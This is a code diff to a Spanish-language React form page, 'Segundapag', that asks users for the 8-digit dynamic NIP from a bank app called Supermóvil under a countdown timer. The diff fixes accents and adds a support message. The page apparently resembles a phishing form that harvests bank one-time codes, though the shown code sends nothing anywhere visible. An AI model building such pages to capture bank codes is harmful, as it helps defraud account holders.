@@ -64,13 +64,17 @@ function Segundapag() {
       </div>
       <form className="auth-form" onSubmit={handleSubmit}>
         <label>
-          Por tu seguridad, confirma esta operecion con el nip dinamico de 8 digitos que genera Supermovil:
+          Por tu seguridad, confirma esta operación con el NIP dinámico de 8 dígitos que genera Supermóvil:
           <input type="tel" name="sms-code" maxLength={8} placeholder="8 dígitos" className="auth-input" required />
         </label>
         <div className="auth-timer">
           Tiempo restante: {formatTime(timeLeft)}
         </div>
         <button type="submit" className="auth-continue-button" disabled={timeLeft === 0}>Continuar</button>
+        {/* Texto agregado debajo del botón */}
+        <p className="auth-info-text">
+          Si tienes problemas para obtener el NIP, por favor contacta a soporte técnico.
+        </p>
       </form>
     </div>
   );
